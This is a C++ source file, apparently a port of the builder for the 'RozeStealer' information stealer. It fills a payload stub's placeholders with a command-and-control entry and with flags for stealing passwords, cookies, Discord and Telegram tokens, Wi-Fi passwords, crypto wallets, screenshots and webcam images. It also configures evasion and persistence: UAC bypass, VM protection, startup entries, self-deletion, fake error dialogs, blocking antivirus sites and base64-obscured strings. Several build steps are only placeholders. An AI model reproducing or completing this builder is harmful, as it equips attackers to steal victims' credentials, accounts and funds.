
#include "Process.h"
#include "../Core/Settings.h"
#include "../Utils/Utility.h"
#include "nlohmann/json.hpp"
#include <fstream>
#include <iostream>
#include <random>
#include <sstream>
#include <algorithm>
#include <string>

namespace RozeStealer {

std::string Process::writeSettings(const std::string& code, const Settings& settings, const std::string& injectionCode) {
    std::string modifiedCode = code;

    // Replace placeholders with actual settings values
    modifiedCode.replace(modifiedCode.find("%c2%"), 4, "(" + std::to_string(settings.c2Mode) + ", " + encryptString(settings.c2Entry) + ")");
    modifiedCode.replace(modifiedCode.find("%mutex%"), 7, encryptString(Utility::getRandomString(16)));
    modifiedCode.replace(modifiedCode.find("%archivepassword%"), 17, encryptString(settings.password));

    modifiedCode.replace(modifiedCode.find("%pingme%"), 8, settings.pingMe ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%vmprotect%"), 11, settings.vmProtect ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%startup%"), 9, settings.startup ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%melt%"), 6, settings.melt ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%uacBypass%"), 11, settings.uacBypass ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%hideconsole%"), 13, (settings.consoleMode == 0 || settings.consoleMode == 1) ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%debug%"), 7, (settings.consoleMode == 2) ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%boundfilerunonstartup%"), 23, settings.boundExeRunOnStartup ? "true" : "");

    modifiedCode.replace(modifiedCode.find("%capturewebcam%"), 15, settings.captureWebcam ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%capturepasswords%"), 18, settings.capturePasswords ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%capturecookies%"), 16, settings.captureCookies ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%capturehistory%"), 15, settings.captureHistory ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%captureautofills%"), 17, settings.captureAutofills ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%capturediscordtokens%"), 22, settings.captureDiscordTokens ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%capturegames%"), 13, settings.captureGames ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%capturewifipasswords%"), 21, settings.captureWifiPasswords ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%capturesysteminfo%"), 19, settings.captureSystemInfo ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%capturescreenshot%"), 19, settings.captureScreenshot ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%capturetelegram%"), 16, settings.captureTelegram ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%capturecommonfiles%"), 20, settings.captureCommonFiles ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%capturewallets%"), 16, settings.captureWallets ? "true" : "");

    modifiedCode.replace(modifiedCode.find("%fakeerror%"), 11, settings.fakeError ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%title%"), 7, settings.fakeErrorTitle);
    modifiedCode.replace(modifiedCode.find("%message%"), 9, settings.fakeErrorMessage);
    modifiedCode.replace(modifiedCode.find("%icon%"), 7, std::to_string(settings.fakeErrorIcon));

    modifiedCode.replace(modifiedCode.find("%blockavsites%"), 15, settings.blockAvSites ? "true" : "");
    modifiedCode.replace(modifiedCode.find("%discordinjection%"), 19, settings.discordInjection ? "true" : "");

    if (!injectionCode.empty()) {
        // Base64 encode the injection code
        std::string encodedInjection = Utility::base64Encode(injectionCode);
        modifiedCode.replace(modifiedCode.find("%injectionbase64encoded%"), 25, encodedInjection);
    }

    return modifiedCode;
}

void Process::prepareEnvironment(const Settings& settings) {
    // This function would handle copying bound.exe, creating noconsole file, and pumpStub file.
    // For now, it's a placeholder.
    std::cout << "Preparing environment..." << std::endl;
}

std::pair<Settings, std::string> Process::readSettings() {
    Settings settings;
    std::string injectionCode;

    std::string configFile = Utility::getSelfDir() + "\\config.json";
    std::ifstream ifs(configFile);
    if (ifs.is_open()) {
        nlohmann::json j;
        ifs >> j;
        settings.updatesCheck = j.value("Check for updates", settings.updatesCheck);
        settings.password = j.value("Password", settings.password);
        // Load other settings from JSON if they exist
        ifs.close();
    }

    // Simulate fetching injection code from GitHub
    // In a real application, use an HTTP client (e.g., libcurl or WinHTTP)
    // For now, we'll use a dummy value.
    injectionCode = "// Dummy Discord Injection Code";

    return {settings, injectionCode};
}

std::string Process::encryptString(const std::string& plainText) {
    // Simple Base64 encoding for now, as in the Python version.
    // In C++, this would typically involve a proper crypto library.
    std::string encoded = Utility::base64Encode(plainText);
    return "base64.b64decode(\"" + encoded + "\").decode()";
}

void Process::junk(const std::string& path) {
    // This function would add random junk code to the stub.
    // For C++, this would be more complex and might involve code generation.
    std::cout << "Adding junk code to: " << path << std::endl;
}

void Process::makeVersionFileAndCert() {
    // This function would handle extracting version info and certificates from other EXEs.
    // This is highly Windows-specific and complex. Placeholder for now.
    std::cout << "Making version file and cert..." << std::endl;
}

void Process::mainProcess() {
    // This would be the main build logic, similar to main() in process.py
    // It would call writeSettings, prepareEnvironment, junk, makeVersionFileAndCert, etc.
    std::cout << "Running main build process..." << std::endl;
}

} // namespace RozeStealer


